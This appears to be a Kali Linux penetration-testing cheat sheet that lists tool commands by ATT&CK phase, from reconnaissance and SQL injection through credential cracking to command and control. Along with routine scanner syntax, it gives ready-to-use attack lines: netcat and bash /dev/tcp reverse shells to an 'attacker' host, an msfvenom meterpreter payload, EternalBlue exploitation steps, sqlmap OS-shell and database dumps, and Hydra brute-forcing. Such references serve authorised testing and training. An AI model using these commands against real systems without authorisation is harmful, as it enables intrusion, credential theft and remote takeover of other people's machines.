# Kali Linux Tools — Master Cheat Sheet

> Quick-reference for all tools organized by MITRE ATT&CK phase. For detailed documentation, see each tool's `.md` file.

---

## Phase 01: Reconnaissance

### Nmap — Network Scanner
```bash
# Basic scan
nmap target

# Scan all ports
nmap -p- target

# Service version detection
nmap -sV target

# OS detection
nmap -O target

# Aggressive scan
nmap -A target

# Script scanning
nmap --script vuln target

# XML output
nmap -oX output.xml target

# Scan subnet
nmap 192.168.1.0/24

# SYN scan (requires root)
sudo nmap -sS target

# Skip host discovery
nmap -Pn target

# Scan specific ports
nmap -p 80,443,8080 target

# NSE scripts
nmap --script=http-title target
nmap --script=smb-enum-shares target
```

### TheHarvester — Email/Subdomain Harvester
```bash
# Basic email harvest
theharvester -d example.com -b google

# All sources
theharvester -d example.com -b all

# Limit results
theharvester -d example.com -b google -l 200

# DNS brute-force
theharvester -d example.com -b google -c

# Output to file
theharvester -d example.com -b google -f output.html
```

### Gobuster — Directory/DNS Brute-forcer
```bash
# Directory mode
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# DNS mode
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# With extensions
gobuster dir -u http://target -w wordlist.txt -x php,html,txt

# Threads
gobuster dir -u http://target -w wordlist.txt -t 50

# Status codes
gobuster dir -u http://target -w wordlist.txt -s 200,301,302

# Recursive
gobuster dir -u http://target -w wordlist.txt -r
```

### FFuf — Fast Web Fuzzer
```bash
# Directory fuzzing
ffuf -u http://target/FUZZ -w wordlist.txt

# Parameter fuzzing
ffuf -u http://target/page?FUZZ=test -w params.txt

# POST data fuzzing
ffuf -u http://target/login -X POST -d "user=admin&FUZZ=password" -w passwords.txt

# Filter by response size
ffuf -u http://target/FUZZ -w wordlist.txt -fs 4242

# Filter by status code
ffuf -u http://target/FUZZ -w wordlist.txt -fc 404

# Recursive
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# With extensions
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt
```

### Feroxbuster — Recursive Content Discovery
```bash
# Basic scan
feroxbuster -u http://target

# With wordlist
feroxbuster -u http://target -w wordlist.txt

# Extensions
feroxbuster -u http://target -x php,html

# Depth limit
feroxbuster -u http://target -d 3

# Threads
feroxbuster -u http://target -t 50

# Filter status codes
feroxbuster -u http://target --filters status-codes 404
```

### Nikto — Web Server Scanner
```bash
# Basic scan
nikto -h target

# Specific port
nikto -h target -p 8080

# SSL scan
nikto -h target -ssl

# Tuning (specific tests)
nikto -h target -Tuning 123b

# Output
nikto -h target -o output.html -Format htm

# Authentication
nikto -h target -id admin:password
```

### Nuclei — Template-based Vulnerability Scanner
```bash
# Basic scan
nuclei -u http://target

# With templates
nuclei -u http://target -t cves/

# Severity filter
nuclei -u http://target -severity critical,high

# Rate limit
nuclei -u http://target -rl 100

# List templates
nuclei -tl

# Update templates
nuclei -update-templates

# Bulk scan
nuclei -l urls.txt -o results.txt
```

### WPScan — WordPress Scanner
```bash
# Basic scan
wpscan --url http://target

# Enumerate plugins
wpscan --url http://target --enumerate vp

# Enumerate themes
wpscan --url http://target --enumerate vt

# Enumerate users
wpscan --url http://target --enumerate u

# Password brute-force
wpscan --url http://target --passwords passwords.txt --usernames admin

# API token (for more data)
wpscan --url http://target --api-token YOUR_TOKEN
```

### Amass — Network Attack Surface Mapping
```bash
# Passive enumeration
amass enum -passive -d target.com

# Active enumeration
amass enum -active -d target.com

# With brute-force
amass enum -brute -d target.com

# Output
amass enum -d target.com -o output.txt

# Config file
amass enum -d target.com -config config.ini

# Visualize
amass viz -d target.com
```

### SpiderFoot — OSINT Automation
```bash
# CLI scan
spiderfoot -s target.com -m sfp_dnsresolve,sfp_portscan_tcp

# All modules
spiderfoot -s target.com -t DOMAIN_NAME

# Web UI
spiderfoot -l 127.0.0.1:5001
```

### Sherlock — Username Enumeration
```bash
# Basic search
sherlock username

# With timeout
sherlock username --timeout 10

# Output
sherlock username --output results.txt

# All sites
sherlock username --print-found
```

### Amass — Attack Surface Mapping
```bash
# Passive
amass enum -passive -d target.com

# Active
amass enum -active -d target.com -o results.txt
```

### Burp Suite — Web Application Testing
```bash
# Start with project
burpsuite --project-file=project.burp

# Headless mode
burpsuite --headless
```
*Note: Burp Suite is primarily a GUI tool. See full documentation for Proxy, Repeater, Intruder, Scanner usage.*

### ZAProxy — OWASP Proxy
```bash
# Start GUI
zaproxy

# Quick start
zaproxy -quickurl http://target -quickout report.html
```

---

## Phase 03: Initial Access

### SQLMap — SQL Injection Tool
```bash
# Basic detection
sqlmap -u "http://target/page?id=1"

# With POST data
sqlmap -u "http://target/login" --data="user=admin&pass=*"

# Databases
sqlmap -u "http://target/page?id=1" --dbs

# Tables
sqlmap -u "http://target/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --dump

# Shell
sqlmap -u "http://target/page?id=1" --os-shell

# Tamper scripts
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between

# Level and risk
sqlmap -u "http://target/page?id=1" --level=5 --risk=3
```

### Metasploit Framework
```bash
# Start console
msfconsole

# Search exploits
msfconsole -q -x "search eternalblue"

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS target
set LHOST attacker

# Run
exploit
```

### SET Toolkit — Social Engineering
```bash
# Start
setoolkit

# Credential harvester
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack
```

---

## Phase 06: Privilege Escalation

### LinPEAS — Linux Privilege Escalation
```bash
# Basic
./linpeas.sh

# Quiet mode
./linpeas.sh -q

# Services
./linpeas.sh -s

# Minimal
./linpeas.sh -m
```

### WinPEAS — Windows Privilege Escalation
```powershell
# Basic
winpeas.exe

# Service scan
winpeas.exe services

# Applications
winpeas.exe applicationsinfo
```

---

## Phase 07: Defense Evasion

### Shellter — PE Infector
```bash
# Automatic mode
shellter -A

# Stealth mode
shellter -S

# Choose payload
shellter -P <payload>
```

### Veil — Payload Generator
```bash
# Start
veil

# List payloads
use 1

# Set options
set LHOST attacker
set LPORT 4444

# Generate
generate
```

---

## Phase 08: Credential Access

### Hydra — Login Cracker
```bash
# SSH brute-force
hydra -l admin -P passwords.txt ssh://target

# HTTP form
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l admin -P passwords.txt ftp://target

# RDP
hydra -l administrator -P passwords.txt rdp://target
```

### John the Ripper — Password Cracker
```bash
# Basic
john hashes.txt

# Wordlist
john --wordlist=passwords.txt hashes.txt

# Format
john --format=md5 hashes.txt

# Show cracked
john --show hashes.txt
```

### Hashcat — GPU Password Cracker
```bash
# Basic
hashcat -m 0 hash.txt wordlist.txt

# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 hash.txt wordlist.txt

# Rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

### Responder — LLMNR/NBT-NS Poisoner
```bash
# Basic
responder -I eth0

# With analysis
responder -I eth0 -A

# WPAD
responder -I eth0 -w
```

---

## Phase 09: Discovery

### BloodHound — AD Reconnaissance
```bash
# Collect
bloodhound-python -u user -p pass -d domain -c All

# Ingest
# Import JSON files into BloodHound GUI
```

### CrackMapExec / NetExec
```bash
# SMB
crackmapexec smb 192.168.1.0/24

# With credentials
crackmapexec smb target -u user -p pass --shares

# Execute
crackmapexec smb target -u user -p pass -x "whoami"

# NetExec (newer)
nxc smb target -u user -p pass --shares
```

---

## Phase 12: Command and Control

### Netcat / Ncat — Swiss Army Knife
```bash
# Listener
nc -lvnp 4444

# Connect
nc target 4444

# File transfer
nc -lvnp 4444 > file (receiver)
nc target 4444 < file (sender)

# Reverse shell
nc -lvnp 4444
# Target: nc attacker 4444 -e /bin/bash
```

### Socat — Advanced Netcat
```bash
# Reverse shell
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Encrypted
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -out shell.crt
socat OPENSSL-LISTEN:4444,cert=shell.crt,key=shell.key,reuseaddr FILE:`tty`,raw,echo=0
```

### Chisel — TCP/UDP Tunnel
```bash
# Server
chisel server --reverse --port 8080

# Client
chisel client attacker:8080 R:socks
```

---

## Phase 15: Forensics

### Volatility — Memory Forensics
```bash
# Image info
volatility -f memory.dump imageinfo

# Process list
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Hash dump
volatility -f memory.dump --profile=Win7SP1x64 hashdump

# DLL list
volatility -f memory.dump --profile=Win7SP1x64 dlllist
```

### YARA — Pattern Matching
```bash
# Scan file
yara rule.yar target.exe

# Scan directory
yara -r rule.yar /path/to/dir

# Strings
yara -s rule.yar target
```

### Binwalk — Firmware Analysis
```bash
# Scan
binwalk firmware.bin

# Extract
binwalk -e firmware.bin

# Entropy
binwalk -E firmware.bin
```

---

## Useful One-Liners

### Quick Network Scan
```bash
nmap -sV -sC -p- -T4 target
```

### Find Web Directories
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 50
```

### Quick DNS Enum
```bash
dnsrecon -d target.com
```

### Extract Metadata
```bash
exiftool image.jpg
```

### Hash Identification
```bash
hash-identifier
```

### Quick Reverse Shell
```bash
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Python HTTP Server
```bash
python3 -m http.server 8080
```

### Generate Payload
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > shell.elf
```

---

*This cheat sheet is a quick reference. For exhaustive documentation, see each tool's full `.md` file.*
*Last updated: 2026-07-18*
